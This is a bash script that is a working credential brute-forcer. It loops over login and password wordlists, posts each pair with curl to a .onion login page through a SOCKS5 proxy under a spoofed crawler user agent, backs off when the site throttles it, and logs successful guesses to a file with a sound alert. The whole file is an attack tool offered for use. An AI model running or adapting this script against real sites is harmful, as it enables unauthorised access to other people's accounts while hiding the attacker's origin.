#!/bin/bash
LOGIN="./login.txt"
PASSWORD="./password.txt"
FOUND="./found.txt"
SOUND="./sound/whistle.wav"
TMPDIR="/tmp/brute-force"
TMPPREVIEW="$TMPDIR/preview.tmp"
SOCKS5="192.168.1.1:9100"
USER_AGENT="Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
COOKIE="cf=81920b0392c893f7fed928c97d04da2d%3A00dce1542862c1689d0f2355059751ac"
URL="http://example.onion/login/"
COUNT="0"
TOTAL="$(($(wc -l "$LOGIN" | cut -d " " -f 1)*$(wc -l "$PASSWORD" | cut -d " " -f 1)))"
ERROR="0"
INCORRECT="0"
CORRECT="0"
TIME_OUT="1"
PAUSE="60"

check()
{
  curl --socks5-hostname "$SOCKS5" --user-agent "$USER_AGENT" --cookie "$COOKIE" --location --data-urlencode "login=$1" --data-urlencode "password=$2" --progress-bar "$URL" > "$TMPPREVIEW"

  if [ "$(stat -c %s "$TMPPREVIEW")" -lt 1024 ] ; then
    let ERROR=ERROR+1
    echo -en "\e[01;30m"$COUNT"/"$TOTAL" - "$1":"$2"\e[00m"
    for (( i=0; i<"$PAUSE"; i++ )) ; do
      if [ "$i" != "$(echo "$(( $PAUSE - 1 ))")" ] ; then
        echo -en "\e[01;30m.\e[00m"
      else
        echo -e "\e[01;30m.\e[00m"
      fi
      sleep 1
    done
    check "$1" "$2"
  fi

  # parse error
  local ignore="$(grep '<div class="errorPanel"><span class="errors">' "$TMPPREVIEW")"

  if [ -n "$ignore" ] ; then
    # parse error message
    local message="$(sed -n '/<div class="errorPanel"><span class="errors">/,/<\/span><\/div>/p' "$TMPPREVIEW" | sed -n 2p | sed 's/^[\t]*//' | sed 's/[\t]*$//')"
    let INCORRECT=INCORRECT+1
    echo -e "\e[01;31m"$COUNT"/"$TOTAL" - "$1":"$2" ("$message")\e[00m"
  else
    let CORRECT=CORRECT+1
    echo -e "\e[01;32m"$COUNT"/"$TOTAL" - "$1":"$2"\e[00m"
    echo "$LINE_LOGIN":"$LINE_PASSWORD" >> "$FOUND"
    aplay -q "$SOUND"
  fi

  sleep "$TIME_OUT"
}

mkdir -p "$TMPDIR"

while read LINE_PASSWORD ; do
  while read LINE_LOGIN ; do
    let COUNT=COUNT+1
    check "$LINE_LOGIN" "$LINE_PASSWORD"
  done < "$LOGIN"
done < "$PASSWORD"

echo -e "\n\e[01;30m"$ERROR"\e[00m \e[01;31m"$INCORRECT"\e[00m \e[01;32m"$CORRECT"\e[00m"

exit 0